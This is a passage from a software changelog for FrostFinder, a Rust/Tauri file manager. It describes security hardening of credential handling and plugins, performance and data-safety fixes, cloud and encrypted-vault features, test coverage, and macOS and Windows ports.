### Fix 2 — SMB password visible in `ps aux` — `mount_smb` (`main.rs`)

`mount -t cifs -o password=<pass>` made credentials readable by any local user via
`ps aux` or `/proc/<pid>/cmdline`.

- Credentials written to a 0600 temp file (`username=…
password=…
` format as
  expected by `mount.cifs`).
- `-o credentials=<path>` is passed to `mount` instead of `password=`.
- Temp file deleted in a finally-style block that fires on both success and error.

### Fix 3 — SMB password visible in `ps aux` — `list_smb_shares` (`main.rs`)

`smbclient -L -U user%pass` had the identical CLI-exposure problem.

- Same 0600 temp file approach; passed via `--authentication-file`.
- File deleted immediately after `smbclient` returns regardless of exit status.

### Fix 4 — WebDAV credentials on CLI + hardcoded `uid=1000` (`mount_webdav`, `main.rs`)

Two issues in one function:
1. `-o password=<pass>` exposed the password on the command line.
2. `uid=1000,gid=1000` hard-coded the mount ownership, silently breaking for any user
   whose UID/GID is not 1000 (container users, non-default desktop installs, etc.).

- Credentials (username + password) written to `~/.davfs2/secrets` (0600), the
  format davfs2 reads natively: `<mountpoint> <username> <password>`.
- No credential options are passed on the `mount` command line at all.
- `uid`/`gid` obtained at runtime from `libc::getuid()` / `libc::getgid()`.

### Fix 5 — WebDAV credentials not removed on disconnect (`unmount_cloud`, `main.rs`)

Credentials written to `~/.davfs2/secrets` were never cleaned up on disconnect,
causing them to accumulate indefinitely.

- `unmount_cloud` now strips every line matching the mount-point path from
  `~/.davfs2/secrets` after a successful unmount.

---

## What's in 6.0.9 (Beta 6, r17) — Phase 9: Security Hardening

**Files changed:** `src-tauri/src/main.rs`, `src/main.js`
**Rust recompile required:** Yes

---

### Fix 1 — Plugin system: trust-on-first-use, 30s timeout, 1 MB output cap (`main.rs`, `main.js`)

Custom actions previously ran via `sh -c` with no verification, timeout, or output limit.

**Rust:**
- `djb2(cmd)` — fast hash of the plugin command string
- `plugin_trust_path()` → `~/.local/share/frostfinder/plugin_trust.json`, keyed by plugin ID
- `check_plugin_trust(plugin_id, command)` — returns `{trusted, changed, first_run}`; trusted when stored hash matches current
- `approve_plugin(plugin_id, command)` — writes current hash to the trust store
- `run_plugin_command` gains a 30-second `TIMEOUT_SECS` wall-clock guard (kills child on breach)
- `run_plugin_command` gains a 1 MB `OUTPUT_CAP` for combined stdout+stderr; truncates with notice rather than accumulating unboundedly
- Both new commands registered in `invoke_handler`

**JS (`runPlugin`):**
- After the optional confirm dialog, calls `check_plugin_trust` before executing
- First run or hash change → shows a `confirm()` dialog with the full command string
- On user approval, calls `approve_plugin` to persist the new hash
- Wrapped in `try/catch` so missing command (older builds) fails silently

### Fix 2 — CSP wildcard port (documented, blocked by p7 fix)

The `connect-src http://127.0.0.1:*` CSP wildcard is now mooted by the Phase 7 media port lockfile: the media server reuses the same port across instances rather than binding a new one. The CSP can be tightened to a specific port once the port is made fully deterministic. Tracked as a known limitation in SECURITY.md until then — no code change needed in this phase.

### Fix 3 — Symlink cycle guard in `search_advanced` and `scan_dir_sizes` (`main.rs`)

Neither walker checked for symlink loops. A cycle (`a → b → a`) would spin until the depth cap or a stack overflow.

**`search_advanced` walker:**
- All symlinked directory entries are now skipped unconditionally (`symlink_metadata().is_symlink() → continue`)
- Inode-cycle guard (`HashSet<u64>` of visited inodes via `MetadataExt::ino()`) prevents loops even when `follow_symlinks` is added in future

**`scan_dir_sizes` rec():**
- Returns 0 immediately for any symlink path
- Inode-cycle guard via the same `visited: &mut HashSet<u64>` pattern; each top-level entry gets its own fresh set

### Fix 4 — Error log leaks full filesystem paths (`main.rs`)

`append_error_log` wrote raw error messages containing `/home/username/...` paths.

- Strips `$HOME/` prefix, replacing with `~/` before writing — removes the most identifying information while keeping paths debuggable
- Sets `0600` (owner read/write only) on first file creation via `std::os::unix::fs::PermissionsExt::from_mode`

---
## What's in 6.0.8 (Beta 6, r16) — Phase 8: Daily Driver Polish + Sidebar Settings Button

**Files changed:** `src-tauri/src/main.rs`, `src/main.js`, `src/views.js`, `src/utils.js`, `src/style.css`
**Rust recompile required:** Yes

---

### Fix 1 — Batch rename preview uses Rust logic (`main.rs`, `views.js`)

The dialog preview was built in JS and diverged from the Rust rename path on Unicode
names, multi-dot extensions, and empty stems. Both the live preview (300ms debounce on
every keystroke) and the Preview button now pass `dry_run: true` to `batch_rename`,
so the preview is always exactly what the rename will produce.

- `BatchRenameOptions` gains `pub dry_run: Option<bool>`
- When `dry_run == Some(true)`, Rust computes new paths and returns them without calling `fs::rename`
- `views.js` preview call sites updated to `{ ...opts, dry_run: true }`

### Fix 2 — Relative timestamps (`utils.js`, `main.js`)

`fmtDate` replaced with a smart formatter. `fmtDateAbsolute` added for hover titles.

| Age | Display |
|-----|---------|
| < 1 min | Just now |
| < 1 hour | X min ago |
| Today | Today, 2:34 PM |
| This week | Tuesday |
| This year | Mar 21 |
| Older | Mar 21, 2025 |

Date cells in list view now carry a `title` attribute with the full absolute timestamp.

### Fix 3 — Per-folder sort preferences (`main.js`)

`sortState` was a single global. Sort Downloads by date, navigate to Projects — it
stayed date-sorted. Now each folder remembers its own sort.

- `ff_sort_prefs` key in `localStorage`: JSON map of `{path → {col,dir,foldersFirst}}`, capped at 200 entries (LRU eviction)
- `_saveSortPrefForPath(path)` — called from the sort popup Apply handler
- `_applySortPrefForPath(path)` — called from `applyNavState` inside `navigate()`

### Fix 4 — Ctrl+K path-jump omnibar (`main.js`)

New `_showOmnibar()` — a centered floating overlay (z-index 9800) with a search input.

- Empty query → shows last 10 recent paths
- Typing → queries `search_index_query` for directory matches, merges with recents
- Arrow keys navigate, Tab auto-completes the current segment, Enter navigates, Esc closes
- Keyboard binding: `Ctrl+K` (noInputBlock — works even when search box has focus)

### Fix 5 — Open Recent (Ctrl+Shift+E) (`main.js`)

New `_showOpenRecent()` — a compact overlay listing the last 15 navigated paths. Click
any row to navigate. Keyboard binding: `Ctrl+Shift+E`. (Distinct from `Ctrl+Shift+E`
which was previously unbound — no existing binding was displaced.)

### Fix 6 — Archive compression level picker (`main.rs`, `main.js`)

`compress_files` previously always used zlib default compression with no user control.

**Rust:** `compression_level: Option<u8>` parameter added. Mapped to zip crate:
`None/4-6` → default, `0` → Stored, `1-3` → fast (level 1), `7-9` → best (level 9).

**JS:** Three-button toggle added to the compress dialog (Fast / Balanced / Small).
Default is Balanced. Selected level is passed as `compressionLevel` to `invoke`.

### Sidebar settings button (`main.js`, `style.css`)

A **Settings** button is now pinned at the bottom of the sidebar at all times.

- Rendered by `renderSidebar()` into a `.sb-footer` div appended after the scrollable content
- Sidebar uses `display:flex;flex-direction:column` so the footer sticks to the bottom
- Hover animation: gear icon rotates 45° on hover
- Clicking opens `_showSettings()` — identical to `Ctrl+,`

---
## What's in 6.0.7 (Beta 6, r15) — Phase 7: Performance & Reliability

**Files changed:** `src-tauri/src/main.rs`, `src/main.js`
**Rust recompile required:** Yes

---

### Fix 1 — In-memory filename search index (`main.rs`, `main.js`)

`deep_search` previously walked the filesystem on every keystroke. Filename-only
searches now query a Rust in-memory index built at startup.

**Rust (`main.rs`):**
- `IndexEntry` struct — `name_lc`, `path`, `is_dir`, `size`, `modified`
- `SEARCH_INDEX: OnceLock<RwLock<Vec<IndexEntry>>>` global store
- `index_home_dir()` — walks `$HOME` at startup in a background thread (depth ≤ 12,
  skips `.` prefixed entries, `/proc`, `/sys`, `/dev`)
- `index_apply_event(dir)` — shallow re-index of one directory; called from the
  inotify debounce loop on every `dir-changed` event to keep the index in sync
- `search_index_query(query, max_results)` — O(n) substring match over the index,
  returns sorted `Vec<IndexSearchResult>`, registered in `invoke_handler`
- Background thread spawned from `main()`: `std::thread::spawn(|| index_home_dir())`

**JS (`main.js`):**
- `doGlobalSearch()` now branches on query prefix:
  - Plain text → `search_index_query` (instant, no disk I/O)
  - `content:` or `regex:` prefix → `deep_search` (full filesystem walk, content scan)
  - `search_index_query` failure → falls back to `deep_search` automatically

### Fix 2 — Copy/move cancel button (`main.rs`, `main.js`)

`copy_files_batch` and `move_files_batch` were fire-and-forget with no cancel path.

**Rust (`main.rs`):**
- `FILE_OP_CANCEL: AtomicBool` static — set `false` at the start of each operation,
  checked between every file transfer; emits a `finished: true, error: "cancelled"`
  event and returns early when set
- `cancel_file_op()` Tauri command — sets `FILE_OP_CANCEL = true`, registered in handler

**JS (`main.js`):**
- Both drop handlers (HTML5 `setupDropTarget` and `tauri://drag-drop`) upgraded from
  `_sbProgress.start()` to `_sbProgress.addJob(..., cancelFn)` where `cancelFn` calls
  `invoke('cancel_file_op')`
- Progress updates use `updateJob` / `finishJob` (named-job API)
- The existing ✕ button in the status-bar progress widget is now wired end-to-end

### Fix 3 — Media server port lockfile (`main.rs`)

`start_media_server()` previously bound a new random port on every process start,
silently failing if a second instance was already running.

- `media_port_file()` → `~/.local/share/frostfinder/media.port`
- On startup: if the file exists and its PID is still alive (`/proc/<pid>` present),
  re-use that port without binding a new socket
- On bind: write `PORT\nPID\n` to the lockfile
- On `main` window `Destroyed`: `std::fs::remove_file(media_port_file())` — clean up
  on normal exit

### Fix 4 — Tags SQLite DB integrity check & WAL (`main.rs`)

`tag_db()` previously opened `tags.db` without any integrity verification. A corrupt
database produced opaque SQL errors with no recovery path.

- `PRAGMA integrity_check` runs on every open; if result ≠ `"ok"`, the file is renamed
  to `tags.db.corrupt.<unix_timestamp>` and a fresh database is created
- `PRAGMA journal_mode=WAL` added to the init batch — reduces contention and prevents
  journal file bloat
- `TAG_DB_WRITE_COUNT: AtomicU32` — incremented on every `db_write_tags()` call;
  every 500th write triggers `PRAGMA wal_checkpoint(TRUNCATE)` to keep WAL bounded

---
## What's in 6.0.6 (Beta 6, r14) — Phase 6: Data Safety

**Files changed:** `src/ql-window.js`, `src/main.js`
**Rust recompile required:** No

### Fix 1 — Quick Look editor autosave & crash recovery (`ql-window.js`)

A force-killed app mid-edit previously lost all unsaved content permanently.
The editor now writes a crash-recovery draft to `localStorage` every 5 seconds
while the document is dirty.

**Behaviour:**
- Draft key: `ff_draft_<djb2-hash-of-path>` — no slashes or special characters
- On open: if a draft exists and is **newer** than the file's `mtime`, a blue
  restore banner appears at the top of the editor with **Restore** and
  **Dismiss** buttons
- **Restore** replaces the editor content, enters edit mode, and marks dirty
- **Dismiss** deletes the draft without touching the file
- **Save** (clean write to disk): clears the draft and cancels the timer
- **Discard**: clears the draft and cancels the timer
- **Close** (window hide): clears the draft and cancels the timer
- Startup GC: drafts older than 7 days are evicted automatically on every
  `ql-window.js` load — no unbounded localStorage growth

### Fix 2 — Drag-and-drop no longer silently overwrites on conflict (`main.js`)

Dragging files onto a folder that already contains same-named files previously
invoked `copy_files_batch` directly, bypassing the conflict dialog that clipboard
paste already shows. Three code paths are fixed:

| Path | Location | Fix |
|------|----------|-----|
| HTML5 `drop` event (`setupDropTarget`) | `main.js` | `_checkConflicts` + `_showConflictDialog` before `copy_files_batch` |
| `tauri://drag-drop` internal drag | `main.js` | Same guard added to the Tauri event handler block |
| F5 cross-pane copy (`crossPaneCopy`) | `main.js` | Same guard before `copy_files_batch` |

**Behaviour (all three paths):**
- **Replace** — proceeds with the original file list (overwrites)
- **Skip** — filters out conflicting filenames, copies the rest
- **Cancel** — aborts the operation entirely
- Move operations (`move_files_batch`) are not affected — moves remove the
  source so there is no "overwrite" risk; the check is copy-only

### Note: Tab persistence (Phase 6, Item 3) — already complete

`saveSession()` / `restoreSession()` in r13 fully serialise and restore the
complete `tabs[]` array including `viewMode`, scroll positions, `colWidths`,
and `selIdx`. This item requires no further work.

---
## What's in 6.0.5 (Beta 6, r13) — Phase 5: Accessibility Automation

**Files changed:** `src/test/a11y.test.js` (new), `scripts/gen-shortcuts-readme.js` (new),
`README.md` (shortcuts table regenerated), `package.json` (axe-core dev-dep, gen-shortcuts script)

### 1. Automated Orca checklist regression tests

New file `src/test/a11y.test.js` — 42 test cases covering all 15 Orca checklist
scenarios from `CONTRIBUTING.md`. Tests use **axe-core** for structural ARIA
validation and direct DOM assertions for live-region / focus-management checks.
No screen reader or live Tauri process required — runs entirely in jsdom via Vitest.

**Coverage by checklist item:**

| Item | Scenario | Test approach |
|------|----------|---------------|
| 2 | Navigate → folder name announced | `announceA11y` live region textContent assertion |
| 3 | Arrow through files → aria-label on rows | `[role=option]` presence + non-empty `aria-label` |
| 4 | Select file → aria-selected toggles | `aria-selected` attribute value assertion |
| 5 | Context menu → `role=menu` + `aria-label` | Structural assertion |
| 6 | Arrow through menu items → `role=menuitem` | `querySelectorAll([role=menuitem])` count |
| 8 | Settings dialog → `role=dialog` + `aria-label` | Structural assertion + axe validation |
| 10 | Close dialog → Escape key | `KeyboardEvent` dispatch + DOM presence check |
| 11 | Switch view mode → view name announced | `announceA11y` parameterised over all 4 views |
| 12 | Open Trash → count announced | Singular + plural + empty live region assertions |
| 13 | Toast → live region announced | `announceA11y` rAF double-buffer pattern verified |
| 14 | Cheatsheet dialog → keyboard-reachable | `role=dialog`, close btn, Escape, row content |
| 15 | Dual-pane switch → pane announced | `announceA11y` content assertion |

**`announceA11y` deep-tested (items 2, 13):** live region creation, `role=status`,
`aria-live=polite`, `aria-atomic=true`, off-screen CSS, rAF clear-then-set pattern
(prevents screen readers from skipping repeated identical announcements), no duplicate
elements across calls.

**axe-core used for structural validation on:**
- Column view (listbox + option roles)
- Context menu (menu + menuitem + separator roles)
- Modal dialogs (dialog + aria-modal + aria-label)
- Empty column view (no violations baseline)

`axe-core` added to `devDependencies` in `package.json`.

### 2. Keyboard shortcut table as single source of truth

New script `scripts/gen-shortcuts-readme.js` reads `_KB_DEFAULTS` from
`src/main.js` and regenerates the `## Keyboard Shortcuts` section of `README.md`.

- **Update mode** (`node scripts/gen-shortcuts-readme.js`): rewrites the README section
- **Check mode** (`node scripts/gen-shortcuts-readme.js --check`): exits 1 if the README
  is out of sync with `_KB_DEFAULTS` — add to CI so the build fails on drift

`npm run gen-shortcuts` added to `package.json` scripts.

The README shortcut table has been regenerated from `_KB_DEFAULTS` (30 shortcuts,
6 categories). The old hand-maintained table is gone.

**To update shortcuts:** edit `_KB_DEFAULTS` in `src/main.js`, then run
`node scripts/gen-shortcuts-readme.js`. Both the in-app cheatsheet and README
now derive from the same object.

---
## What's in 6.0.4 (Beta 6, r12) — Phase 4: UX Gaps

**Files changed:** `src/utils.js`, `src/main.js`, `src-tauri/src/main.rs`, `src/locales/*.json`

### Fix 1 — `fmtDate` now respects the user's locale

`fmtDate` in `utils.js` previously hardcoded `'en-US'` as the
`toLocaleDateString` locale, so file-listing dates were always formatted in
English regardless of the user's language setting. `utils.js` now exports
`setDateLocale(lang)` which stores the resolved locale in `_dateLocale`.
`initI18n()` in `main.js` calls `setDateLocale(lang)` immediately after
resolving the user's locale, so all date strings across every view render in
the correct locale from the very first paint.

### Fix 2 — Icon theme picker rebuilt with disk-load support

The picker previously displayed a single "Built-in" option with no way to add
more — the UI implied broken functionality.

**New behaviour:**

- A **"📂 Load from folder…"** button opens a native directory picker. The
  chosen folder is scanned for `.svg` files whose basenames match any of the
  47 known icon keys (`folder.svg`, `img.svg`, `code.svg`, etc.). Unrecognised
  files are silently skipped so partial themes work out of the box.
- Matched SVGs are hot-swapped into the icon system immediately. `getIcon()`
  now checks the disk-icon map first and falls back to the built-in SVG set,
  so partial themes never leave holes.
- The loaded SVG map is persisted in `localStorage` as `ff_diskThemeSvgs`,
  meaning icons reload synchronously on next launch without a fresh Rust scan.
- A **"↻ Reload current theme"** button re-scans the folder for live updates.
- Current theme is shown with icon count ("42 icons").
- Switching back to "Built-in" clears `ff_diskThemeSvgs` and `ff_iconTheme`.

**New Rust command `scan_icon_folder(folderPath)`:** Reads the directory,
filters `.svg` files matching the 47 known icon keys, performs a basic
`<svg` sanity check, and returns `[{ key, svg }]`. Registered in
`generate_handler!`.

### Locale

9 new keys (`theme.*`) added to all 7 locale files. Now **292 keys each**.

---
## What's in 6.0.3 (Beta 6, r11) — Phase 3: Test Coverage

**Files changed:** `src/test/main.test.js` (new), `src-tauri/src/main.rs` (tests appended), `src-tauri/Cargo.toml` (dev-dep added)

### JavaScript test suite — from 59 to 120 test cases (+61)

New file `src/test/main.test.js` adds four test suites:

**`t()` translation helper (9 cases)** — key lookup, missing-key fallback, `{var}`
interpolation, plural selection via `n` and `count`, numeric coercion, and keys with no
plural variant.

**`pushUndo / undoLastOp / redoLastOp` (28 cases)** — stack limit enforcement (50-entry
cap, oldest evicted), redo-stack clearing on new push, correct IPC command per op type
(`move_file`, `delete_items`, `copy_file`, `rename_file`, `set_file_tags_v2`), reversed
item order during undo, multi-item batch, `cannot_redo_create` guard, and full
undo/redo roundtrip consistency.

**`loadPersistentSettings / persistSettings` (11 cases)** — localStorage population
from `get_settings`, no-overwrite guard for in-session keys, `_reset` flag detection
(toast queued, flag not written to localStorage), graceful IPC error handling, non-`ff_*`
key exclusion from `set_settings` payload, and no-op guard before settings are loaded.

**Search result filters — type / size / date (13 cases)** — each filter type in
isolation (folder, image, video, audio, doc, archive), size range (minSize, maxSize,
combined), date range (after, before, combined), combined type+size and type+date, and
clearing all filters restoring the full result set.

### Rust test suite — from 28 to 52 test functions (+24)

New tests appended to `src-tauri/src/main.rs`:

**`search_advanced` (11 tests)** — filename prefix match, case-insensitive plain query,
regex match, invalid regex returns error, hidden file exclusion (default off, flag on),
content search with snippet, recursive vs non-recursive traversal, nonexistent root
returns empty, results sorted by name case-insensitively.

**`batch_rename` (9 tests)** — all five rename modes (`find_replace`, `prefix`,
`suffix`, `number`, `case`); number mode with start_num and zero-padded width; case
modes `lower`, `upper`, `title`; collision produces `ERROR:` entry; empty input returns
empty output.

**`migrate_settings` (4 tests)** — version field set on empty object, idempotent at
current version, upgrades from version 0 while preserving user keys, all user `ff_*`
keys preserved through migration.

**Dev dependency added:** `futures = { version = "0.3", features = ["executor"] }` to
`[dev-dependencies]` in `Cargo.toml` for `futures::executor::block_on` in async Rust tests.

---
## What's in 6.0.2 (Beta 6, r10) — Phase 2: Silent Failure Fixes

**Files changed:** `src/main.js`, `src-tauri/src/main.rs`, `src/locales/*.json`

### 1. Platform + optional-dep detection on startup

`state._platform` (`'linux'|'macos'|'windows'`) and `state._deps` (availability map for
`ffmpeg`, `ffprobe`, `heif_convert`, `mpv`, `rclone`, `gocryptfs`, `sshfs`,
`curlftpfs`) are now populated at init via `get_platform()` and `check_optional_deps()`.
Both calls are fire-and-forget so they never block startup.

### 2. Platform-gated UI items

Three UI triggers that are Linux-only now check `state._platform` before rendering:

| Item | Was | Now |
|------|-----|-----|
| "Open With…" context menu | Always shown | Linux only (`list_apps_for_file` is Linux-only) |
| "Open as Root (pkexec)" permission dialog button | Always shown | Linux only (pkexec not available on macOS/Windows) |
| LUKS/BitLocker unlock button in Locations sidebar | Always shown | Linux only (udisksctl is Linux-only) |

### 3. Settings corruption — one-time toast

When `settings.json` fails to parse, `get_settings()` now returns `{ _reset: true, _v: 1 }`
instead of silently returning `{}`. The JS `loadPersistentSettings()` function detects
`_reset: true` and shows a deferred toast: *"Settings file was corrupted and reset to
defaults."* The `_reset` flag is never written to `localStorage`. The corrupted file is
still backed up with a Unix timestamp suffix for manual recovery.

### 4. SFTP sidebar — password-auth reconnect

The sidebar `↻` reconnect button for SFTP mounts with no stored key path (password-auth
connections) is silently replaced with a `↗` dialog-link button. Clicking it opens
`showSftpDialog()` pre-filled with the saved host, port, username, and remote path so
the user only needs to re-enter their password. The silent auth-failure toast branch is
removed.

`showSftpDialog()` gains an optional `prefill = {}` parameter, so any caller can
pre-populate fields.

### 5. Cloud dialog — inline recovery UI on mount failure

Failed mount attempts in the cloud dialog now render an inline error below the failing
account row instead of dismissing the dialog with a raw toast. The error includes:
- A **"Re-authenticate →"** button for OAuth/token failures (reopens the dialog's
  add-account flow)
- A **"Try again"** button for transient errors (re-attempts `mount_cloud_provider`
  without OAuth)

### Locale changes

2 new keys added to all 7 locale files (now **283 keys** each):
- `toast.settings_reset` — settings corruption toast
- `error.dep_missing` — generic missing-dep message template

---

## What's in 6.0.1 (Beta 6, Release 1) — Critical Bug Fix

**Frontend-only change.** No Rust recompile required. Only `src/main.js` is modified.

### Bug Fixed — `renderSidebar()` closed 127 lines too early (`src/main.js`)

**Root cause:** The closing brace `}` that terminates `renderSidebar()` was placed on
line 3402, immediately after the favourites drag-to-reorder block. The four network-mount
blocks below it — SFTP, FTP, SMB, and WebDAV/Cloud — were indented as if they were inside
the function body, but they were actually at **module scope**.

**Effect:**
- The four `invoke()` calls (`get_sftp_mounts`, `get_ftp_mounts`, `get_smb_mounts`,
  `get_cloud_mounts`) ran **once** at module load time, before the sidebar DOM existed
  and when `state.currentPath` was still `''`.
- Every subsequent call to `renderSidebar()` — connecting a new SFTP server, mounting
  an SMB share, clicking Disconnect — never refreshed those sections.
- Users saw permanently blank SFTP / FTP / SMB / Cloud sections in the sidebar after
  the first mount or after connecting a new network share. Workaround was a full app
  reload.

**Fix:** Removed the premature `}` on line 3402 and added `} // end renderSidebar()`
after the cloud-mounts `.catch(() => {})` block, so all four network-mount sections are
now inside `renderSidebar()` and run on every call as intended.

**Files changed:** `src/main.js` (1-line structural fix — remove one `}`, add one `}`
127 lines later).

---

## What's in 5.0.82 — Phase 5: macOS & Windows Ports

**Rust recompile required.** `src-tauri/src/main.rs`, `Cargo.toml`, `tauri.conf.json`, `.github/workflows/ci.yml`.

### Architecture

Phase 5 focuses on making the Rust backend compile and run correctly on all three platforms. The frontend (Vite + vanilla JS + Tauri IPC) is already cross-platform with no changes needed. The work is entirely in platform-conditional Rust and CI infrastructure.

### Platform-conditional Rust (`src-tauri/src/main.rs`, `Cargo.toml`)

**xattr (tag storage)**

`xattr` is a Linux/macOS-only crate. The `xattr_read_tags` and `xattr_write_tags` functions are now gated behind `#[cfg(not(target_os = "windows"))]`. On Windows, both functions are no-ops that return `None`/`false`, causing all tag reads/writes to route through the SQLite fallback — which already existed for FAT32/exFAT/network filesystems and requires no special-casing.

The `xattr = "1"` dependency is moved to `[target.'cfg(not(target_os = "windows"))'.dependencies]` in `Cargo.toml`.

**`is_fuse_path` — three implementations**

| Platform | Detection method |
|----------|-----------------|
| Linux | Reads `/proc/mounts`, matches mount point by longest prefix, checks fstype |
| macOS | `libc::statfs` → `f_fstypename` field; matches `macfuse`, `smbfs`, `nfs`, `webdav`, `afpfs` |
| Windows | Returns `true` for UNC paths (`\\server\share` or `//...`) |

**Windows drive enumeration**

The empty stub `fn get_drives_platform() -> Vec<DriveInfo> { Vec::new() }` is replaced with a wmic-based implementation: `wmic logicaldisk get DeviceID,Size,FreeSpace,VolumeName,DriveType /format:csv`. This avoids unsafe Win32 FFI while reliably enumerating all logical drives including removable media. Drive type 5 (CD/DVD) is filtered out.

`open_terminal` already had macOS (AppleScript → Terminal.app) and Windows (Windows Terminal → cmd.exe fallback) implementations.

### Bundle targets (`tauri.conf.json`)

Bundle targets extended from `[deb, rpm, appimage]` to:
```json
["deb", "rpm", "appimage", "dmg", "app", "msi", "nsis"]
```

macOS and Windows bundle config sections added:
- **macOS:** `minimumSystemVersion: "10.15"`, signing identity placeholder
- **Windows:** SHA-256 digest, WiX language `en-US`, NSIS English

### macOS entitlements (`src-tauri/entitlements/macos.entitlements`)

Required for App Sandbox and Notarization:
- `com.apple.security.network.client` — WebDAV/SFTP/FTP/SMB/cloud
- `com.apple.security.files.user-selected.read-write` — file access
- `com.apple.security.files.downloads.read-write` — Downloads folder
- `com.apple.security.cs.disable-library-validation` — allows helper tools (ffmpeg, rclone, gocryptfs)

### Cross-platform CI matrix (`.github/workflows/ci.yml`)

New `rust-crosscheck` job runs on `macos-14` (Apple Silicon) and `windows-2022` in parallel after the Linux `rust` job passes. Uses `cargo check --locked --target <triple>` — compile-only, no test execution (cross-platform test execution is complex). Both platforms cache Cargo registry/git/target.

Release job extended to 7 bundle variants across 3 OS runners:

| OS | Bundles |
|----|---------|
| ubuntu-22.04 | deb, rpm, appimage |
| macos-14 | dmg, app |
| windows-2022 | msi, nsis |

All artifacts uploaded per `frostfinder-<OS>-<bundle>` and merged into a single GitHub Release.

### Distribution packaging

- **`packaging/homebrew/frostfinder.rb`** — Homebrew cask with architecture-conditional Intel/Apple Silicon URLs. Submit to `homebrew/homebrew-cask`.
- **`packaging/winget/FrostFinder.FrostFinder.yaml`** — Winget singleton manifest (v1.6.0). Submit to `microsoft/winget-pkgs`. Lists both MSI and NSIS installers.

### README

Downloads section updated with Linux (Flatpak, AUR added), macOS (DMG + Homebrew), and Windows (MSI + NSIS + Winget) tables. Minimum system requirements noted (macOS 10.15+, Windows 10 1809+). Roadmap updated — macOS/Windows and Flatpak/AUR marked done.

---

## What's in 5.0.81 — Phase 4: Git Status Badges + Encrypted Vaults

**Rust recompile required.** `src-tauri/src/main.rs`, `src/main.js`, `src/views.js`, `src/style.css`, all locale files.

### Feature — Git status badges (`src/main.js`, `src/views.js`, `src/style.css`)

Files inside a git repository now display a 6px coloured dot alongside their icon in all views:

| Dot colour | Status code | Meaning |
|-----------|-------------|---------|
| 🟠 Amber  | M | Modified in worktree |
| 🟢 Green  | S | Staged (index) |
| ⚫ Grey   | U | Untracked |
| 🔴 Red    | C | Merge conflict |

Folders propagate: if any file inside a subdirectory has a status, the folder itself gets an amber dot.

**Branch pill** — a small pill badge appears in the toolbar path bar showing the current branch name (e.g. `main`). A small amber dot appends when the worktree is dirty. Clicking has no effect; hovering darkens the border.

**Implementation:** `get_git_status(path)` calls `git status --porcelain=v1 -u` and `git rev-parse --abbrev-ref HEAD` via `std::process::Command` (no git2 crate needed). Results are cached in `GIT_STATUS_CACHE` (a `Mutex<HashMap<root → (status, timestamp)>>`) with a 3-second TTL. `refreshGitStatus(path)` is called on every `navigate()` and the result is exposed to `views.js` via `injectDeps`. The badge HTML is injected as `${d().gitBadgeHtml?.(e.path)??''}` into both column-view `_makeColRow` and list-view row templates. `invalidate_git_cache(path)` can be called by `dir-changed` handlers for instant refresh after a commit.

**Opt-out:** Setting `gitBadges: false` in user settings disables badge loading — useful for very large monorepos.

### Feature — Encrypted vaults via gocryptfs (`src-tauri/src/main.rs`, `src/main.js`)

FrostFinder can create and manage encrypted directories using [gocryptfs](https://nuetzlich.net/gocryptfs/) — an optional runtime dependency that is never required to run FrostFinder.

**Dialog** (`Ctrl+Shift+V`) shows existing vaults with lock/unlock toggle and remove button, plus a Create Vault form (name, encrypted directory, password + confirm). After creation the vault is auto-unlocked and navigated to.

**Vault registry** stored at `~/.config/frostfinder/vaults.json` — persists name, encrypted_dir, and mount_point. Passwords are **never stored**; a warning is displayed in the UI. The mount base is `/tmp/frostfinder-vaults/<vault-id>`.

**Sidebar Vaults section** — unlocked vaults appear with a 🔓 icon and a lock button. Clicking navigates to the vault's mount point like any local folder. Since the mount uses FUSE, the existing `is_fuse_path` + polling watcher infrastructure handles live refresh automatically.

**Unlock flow:** password is piped to `gocryptfs -fg -quiet` via stdin; the command polls `/proc/mounts` every 100ms (max 3s) to confirm the mount appeared. Wrong password or corrupted vault returns a descriptive error.

**New Rust commands:** `check_gocryptfs`, `list_vaults`, `create_vault`, `unlock_vault`, `lock_vault`, `remove_vault` — all registered in `generate_handler!`.

### Locale strings

15 new keys (`git.*` × 5, `vault.*` × 10) added to all 7 locale files. Key count: 139 → 154.

---

## What's in 5.0.80 — Phase 3: Native Cloud Storage Integration

**Rust recompile required.** `src-tauri/src/main.rs`, `src/main.js`, all locale files.

### Architecture

Cloud storage is implemented via [rclone](https://rclone.org/) — an open-source, battle-tested tool that already handles OAuth2, token refresh, and the API differences between Google Drive, Dropbox, and OneDrive. FrostFinder never touches raw OAuth tokens; rclone stores them in `~/.config/rclone/rclone.conf`. On Linux, rclone exposes the remote as a FUSE filesystem, so the rest of FrostFinder (directory listing, file ops, tags, search) works on cloud files without any special-casing.

rclone is an **optional runtime dependency** — FrostFinder starts normally without it. The Connect Cloud dialog shows a clear installation error if rclone is not found.

### New Rust commands (`src-tauri/src/main.rs`)

| Command | What it does |
|---------|-------------|
| `check_rclone` | Checks if rclone binary exists, returns version string |
| `list_rclone_remotes` | Lists `ff_`-prefixed remotes from `rclone listremotes --long` |
| `add_cloud_provider(provider, label)` | Runs `rclone config create ff_<label> <type> --auto-confirm` to authorise via browser |
| `mount_cloud_provider(remote_name)` | Runs `rclone mount <remote>: <mountpoint> --vfs-cache-mode writes --daemon` |
| `unmount_cloud_provider(remote_name)` | `fusermount3 -u` → `fusermount -u` → `umount --lazy` fallback chain |
| `remove_cloud_provider(remote_name)` | Unmounts then `rclone config delete` |
| `restore_cloud_mounts` | Re-mounts all `ff_` remotes on startup; silently ignores failures |

All seven registered in `generate_handler!`.

**Naming convention:** all FrostFinder-managed remotes are prefixed `ff_` to avoid collision with the user's existing rclone config. `list_rclone_remotes` only shows `ff_` remotes.

**Mount options:** `--vfs-cache-mode writes` (read-through, write-back cache), `--vfs-cache-max-size 512M`, `--dir-cache-time 5m`, `--poll-interval 15s`, `--daemon` (daemonises so the command returns immediately).

**Unmount fallback chain:** `fusermount3` (systemd-era distros) → `fusermount` (older) → `umount --lazy` (last resort). Mountpoint directory is cleaned up after unmount.

### Connect Cloud Storage dialog (`src/main.js` — `showCloudDialog()`)

Opened via `Ctrl+Shift+G`. The dialog has two sections:

**Connected Accounts** (shown only if remotes exist): lists each `ff_` remote with provider icon, display name, mount status badge (`🟢 Mounted` / `⚫ Not mounted`), a Mount/Unmount toggle button, and a Remove (✕) button.

**Add Account**: three provider tiles — Google Drive 🔵, Dropbox 🟦, OneDrive 🪟. Clicking a tile prompts for a label, then invokes `add_cloud_provider` which runs the rclone browser auth flow. On success, `mount_cloud_provider` is called immediately and the sidebar refreshes.

If rclone is not installed, the dialog shows a styled error card with copy-pasteable install commands for both apt and the official install script.

### Cloud sidebar section (`src/main.js` — `renderSidebar()`)

